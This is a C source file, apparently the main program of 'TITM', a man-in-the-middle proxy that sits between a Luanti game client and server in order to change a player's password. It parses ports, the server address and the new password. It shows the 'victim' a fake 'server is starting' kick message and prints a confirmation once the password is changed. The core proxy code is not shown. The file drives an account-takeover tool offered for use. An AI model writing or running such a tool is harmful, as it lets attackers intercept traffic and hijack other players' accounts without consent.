#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <signal.h>

#include "proxy.h"
#include "util.h"

#define BUFFERSIZE 0x2001 // 8kb are OVERKILL! 512 should be enough according to docs.
#define KICK_MESSAGE "The server is starting. Please connect again now!"


_Noreturn static void arghelp(char* binary_name) {
    printf("Argumente für den Programmaufruf\n %s\n", binary_name);
    puts(YELLOW_BACK
        "\t -b <port>\t Bind-Port \t\t\t MANDANTORY\n"
        "\t -r <address>\t Address of the Remote-Server \t MANDANTORY\n"
        "\t -p <port>\t remote port \t MANDANTORY\n"
        "\t -n <password>\t new password \t\t MANDANTORY\n"
        "\t -? \t\t Show this help"
        RESET
    );
    exit(EXIT_SUCCESS);
}

#define FLAG_ARG_BINDPORT (1 << 0)
#define FLAG_ARG_REMOTEADDR (1 << 1)
#define FLAG_ARG_REMOTEPORT (1 << 2)
#define FLAG_ARG_NEWPASSWORD (1 << 3)
#define ARG_MANDANTORY_AMOUNT 4
static void parse_args(int argc, char** argv, ProxyArgs* proxy_args) {
    register char opt;
    register uint8_t checksum = 0; // Check whether all mandantory args are present
    while ((opt = getopt(argc, argv, "b:p:r:n:?")) != -1) {
        switch (opt) {
        case 'b':
            proxy_args->port = (uint16_t) atoi(optarg);
            checksum |= FLAG_ARG_BINDPORT;
        break;

        case 'p':
            proxy_args->remote_port = (uint16_t) atoi(optarg);
            checksum |= FLAG_ARG_REMOTEPORT;
        break;

        case 'r':
            proxy_args->remote_hostname = optarg;
            checksum |= FLAG_ARG_REMOTEADDR;
        break;

        case 'n':
            proxy_args->new_password = optarg;
            checksum |= FLAG_ARG_NEWPASSWORD;
        break;
        
        default:
            printf("unknown option -%c\n", opt);
            // No break on purpose
        case '?':
            arghelp(argv[0]); // no break - _Noreturn!
        }
    }

    if (checksum != (1 << ARG_MANDANTORY_AMOUNT) - 1) {
        arghelp(argv[0]); // Kein break - _Noreturn!
    }
}

static void opfer_passwort_geaendert(Proxy* proxy, char* username) {
    printf("Changed %s's password!\n", username);
    client_disconnect(&proxy->client);
    halt_proxy(proxy);
}

static void SIG_HANDLER_manueller_abbruch(int signal) {
    puts("Manual Termination!");
    exit(2);
}

int main(int argc, char** argv) {
    signal(SIGINT, SIG_HANDLER_manueller_abbruch);
    puts("TITM. A program to change a Luanti-Player's password\n"
        "Only Client AND Server versions starting from 5.10 are supported! (Backporting should be trivial)\n"
        "USE AT YOUR OWN RESPONSIBILITY!"
    );

    ProxyArgs proxy_args;
    parse_args(argc, argv, &proxy_args);

    proxy_args.victim_kick_message = KICK_MESSAGE;
    proxy_args.victim_passwort_changed_callback = &opfer_passwort_geaendert;

    Proxy* proxy = init_proxy(&proxy_args);

    uint8_t* netbuff = malloc(BUFFERSIZE);
    if (netbuff == NULL) {
        fatal_error("Out of memory!!");
    }

    start_proxy(proxy, &proxy_args);
    puts(YELLOW_TEXT "The proxy is running now!" RESET);
    while (proxy->running) {
        tick_proxy(proxy, netbuff, BUFFERSIZE);
    }
    free_proxy(&proxy);
    free(netbuff);
    
    return EXIT_SUCCESS;
}
// EOF
